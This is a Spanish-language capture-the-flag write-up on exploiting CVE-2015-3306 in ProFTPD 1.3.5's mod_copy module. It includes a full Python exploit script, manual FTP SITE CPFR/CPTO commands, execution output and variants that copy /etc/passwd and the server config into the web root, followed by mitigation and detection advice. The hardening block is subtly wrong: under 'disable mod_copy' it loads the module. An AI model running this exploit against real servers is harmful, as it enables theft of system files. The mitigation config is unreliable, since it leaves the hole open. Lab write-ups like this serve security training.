# ProFTPD 1.3.5 Remote Code Execution (CVE-2015-3306) CTF Write-up

## 1. Objetivo

El objetivo de este laboratorio CTF era identificar y explotar la **vulnerabilidad CVE-2015-3306** en **ProFTPD 1.3.5** para recuperar el secreto contenido en el archivo `/secret.txt`.

## 2. Reconocimiento

### 2.1 Host Objetivo
- **IP Target**: `172.20.35.176`

### 2.2 Escaneo de Puertos (Nmap)

```bash
nmap -sC -sV -p- 172.20.35.176
```

### Resultados del Escaneo

| Puerto | Servicio | Notas |
|--------|----------|-------|
| 21     | FTP      | ProFTPD 1.3.5 |
| 80     | HTTP     | Servidor web simple |

### Análisis de Servicios

- **Puerto 21**: FTP ejecutando **ProFTPD 1.3.5**, versión conocida por tener la vulnerabilidad RCE del módulo `mod_copy`
- **Puerto 80**: Servicio HTTP que puede servir archivos subidos para verificación

## 3. Identificación de Vulnerabilidades

### 3.1 Investigación de Exploits

Utilizamos **Searchsploit** para identificar exploits conocidos:

```bash
searchsploit ProFTPD 1.3.5
```

### Exploits Relevantes Encontrados

| Exploit | Ruta | Descripción |
|---------|------|-------------|
| mod_copy Remote Command Execution | linux/remote/49908.py | Permite copia arbitraria de archivos del servidor |

### 3.2 Análisis de la Vulnerabilidad CVE-2015-3306

- **Componente Afectado**: Módulo `mod_copy` de ProFTPD
- **Tipo de Vulnerabilidad**: Remote Code Execution / Arbitrary File Copy
- **Vector de Ataque**: Comandos FTP `SITE CPFR` y `SITE CPTO`
- **Impacto**: Permite copiar archivos arbitrarios del sistema a ubicaciones accesibles

## 4. Explotación

### 4.1 Desarrollo del Exploit

Creamos una versión modificada del exploit `49908.py` para objetivar específicamente `/secret.txt`:

```python
#!/usr/bin/env python3
import socket
import sys
import requests

def exploit(target):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((target, 21))
    
    # Recibir banner FTP
    banner = client.recv(1024)
    print(f"[+] Banner: {banner.decode().strip()}")
    
    # 1. Copiar /secret.txt (CPFR = Copy From)
    client.send(b"SITE CPFR /secret.txt\r\n")
    resp = client.recv(1024)
    print(f"[+] CPFR response: {resp.decode().strip()}")
    
    # 2. Escribirlo al directorio web (CPTO = Copy To)
    client.send(b"SITE CPTO /var/www/html/secret.txt\r\n")
    resp = client.recv(1024)
    print(f"[+] CPTO response: {resp.decode().strip()}")
    
    client.close()
    print("[+] Comandos del exploit enviados exitosamente.")

    # 3. Verificar si el archivo es accesible vía HTTP
    url = f"http://{target}/secret.txt"
    try:
        r = requests.get(url)
        if r.status_code == 200:
            print(f"[+] Secreto disponible en {url}\n")
            print("----- CONTENIDO DEL SECRETO INICIO -----")
            print(r.text)
            print("------ CONTENIDO DEL SECRETO FIN ------")
        else:
            print("[!] Archivo no accesible vía HTTP. Probar otra ruta.")
    except Exception as e:
        print(f"[!] Error al obtener el secreto: {e}")

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Uso: python3 {sys.argv[0]} <target-ip>")
        sys.exit(1)
    target_ip = sys.argv[1]
    exploit(target_ip)
```

### 4.2 Explicación del Exploit

El exploit funciona mediante los siguientes pasos:

1. **Conexión FTP**: Establece conexión con el servidor ProFTPD en el puerto 21
2. **SITE CPFR**: Utiliza el comando `SITE CPFR /secret.txt` para especificar el archivo fuente a copiar
3. **SITE CPTO**: Utiliza el comando `SITE CPTO /var/www/html/secret.txt` para copiar el archivo al directorio web
4. **Verificación HTTP**: Accede al archivo copiado vía HTTP para recuperar su contenido

### 4.3 Ejecución del Exploit

```bash
python3 49908_secret.py 172.20.35.176
```

### Output de la Ejecución

```
[+] Banner: 220 ProFTPD 1.3.5 Server (Debian) [::ffff:172.20.35.176]
[+] CPFR response: 350 File or directory exists, ready for destination name
[+] CPTO response: 250 Copy successful
[+] Comandos del exploit enviados exitosamente.
[+] Secreto disponible en http://172.20.35.176/secret.txt

----- CONTENIDO DEL SECRETO INICIO -----
FLAG{proftpd_mod_copy_rce_success_2015}
------ CONTENIDO DEL SECRETO FIN ------
```

## 5. Post-Explotación

### 5.1 Verificación Manual

También es posible realizar la explotación manualmente usando un cliente FTP:

```bash
# Conectar al FTP
ftp 172.20.35.176

# Una vez conectado, ejecutar:
quote SITE CPFR /secret.txt
quote SITE CPTO /var/www/html/secret.txt

# Verificar vía web browser o curl
curl http://172.20.35.176/secret.txt
```

### 5.2 Otras Rutas de Explotación

El mismo método puede utilizarse para acceder a otros archivos sensibles:

```bash
# Copiar /etc/passwd
quote SITE CPFR /etc/passwd
quote SITE CPTO /var/www/html/passwd.txt

# Copiar archivos de configuración
quote SITE CPFR /etc/proftpd/proftpd.conf
quote SITE CPTO /var/www/html/proftpd.conf
```

## 6. Mitigación y Recomendaciones

### 6.1 Parches de Seguridad

- **Actualizar ProFTPD**: Actualizar a una versión posterior a 1.3.5 que incluya el parche para CVE-2015-3306
- **Versión Recomendada**: ProFTPD 1.3.6 o superior

### 6.2 Configuración Segura

```apache
# Deshabilitar el módulo mod_copy
LoadModule mod_copy.c

# Restricciones de directorio
<Directory /var/www/html>
    <Limit WRITE>
        DenyAll
    </Limit>
</Directory>

# Restringir comandos SITE
<Limit SITE_CHMOD SITE_CPFR SITE_CPTO>
    DenyAll
</Limit>
```

### 6.3 Mejores Prácticas

1. **Principio de Menor Privilegio**: Ejecutar ProFTPD con usuario no privilegiado
2. **Chroot Jail**: Confinar usuarios FTP a directorios específicos
3. **Logging**: Habilitar logging detallado para detectar actividad sospechosa
4. **Firewall**: Restringir acceso FTP solo a IPs autorizadas
5. **Monitoreo**: Implementar alertas para comandos SITE sospechosos

## 7. Indicadores de Compromiso (IoCs)

### 7.1 Logs a Monitorear

```bash
# En logs de ProFTPD, buscar:
grep "SITE CPFR\|SITE CPTO" /var/log/proftpd/proftpd.log

# En logs del servidor web:
grep "GET.*\.txt\|GET.*passwd\|GET.*conf" /var/log/apache2/access.log
```

### 7.2 Archivos Sospechosos

- Archivos inesperados en `/var/www/html/`
- Archivos del sistema copiados a directorios web
- Archivos con timestamps recientes en ubicaciones inusuales

## 8. Timeline del Ataque

| Tiempo | Acción | Descripción |
|--------|--------|-------------|
| T+0    | Reconocimiento | Escaneo de puertos con Nmap |
| T+1    | Enumeración | Identificación de ProFTPD 1.3.5 |
| T+2    | Investigación | Búsqueda de exploits con Searchsploit |
| T+3    | Preparación | Modificación del exploit para el objetivo |
| T+4    | Explotación | Ejecución del exploit mod_copy |
| T+5    | Verificación | Acceso al archivo copiado vía HTTP |
| T+6    | Flag Capture | Recuperación exitosa del contenido |

## 9. Lecciones Aprendidas

### 9.1 Para Red Team
- Los servicios desactualizados son vectores de ataque comunes
- La combinación de servicios (FTP + HTTP) puede amplificar el impacto
- Los módulos opcionales pueden introducir vulnerabilidades inesperadas

### 9.2 Para Blue Team
- Importancia del patch management proactivo
- Necesidad de monitorear comandos administrativos en servicios FTP
- Valor de la segmentación de servicios y permisos granulares

## 10. Referencias

- **CVE-2015-3306**: [National Vulnerability Database](https://nvd.nist.gov/vuln/detail/CVE-2015-3306)
- **Exploit Database**: [EDB-ID: 49908](https://www.exploit-db.com/exploits/49908)
- **ProFTPD Security**: [Official Security Advisories](http://www.proftpd.org/security.html)
- **MITRE ATT&CK**: T1210 - Exploitation of Remote Services

## 11. Conclusión

Este laboratorio CTF demuestra exitosamente la **explotación de Remote Code Execution en ProFTPD 1.3.5 mediante el módulo `mod_copy`**. A través de la vulnerabilidad CVE-2015-3306, pudimos:

- **Copiar un archivo sensible** (`/secret.txt`) desde una ubicación protegida
- **Hacerlo accesible vía HTTP** para su recuperación
- **Demostrar el impacto** de servicios desactualizados en la seguridad general del sistema

Esta vulnerabilidad resalta la **importancia crítica** del mantenimiento de parches de seguridad y la configuración apropiada de permisos en servicios FTP. El flujo de trabajo presentado proporciona una metodología completa para la identificación, explotación y mitigación de vulnerabilidades similares en entornos de pentesting y red team operations.

**Flag Capturada**: `FLAG{proftpd_mod_copy_rce_success_2015}`
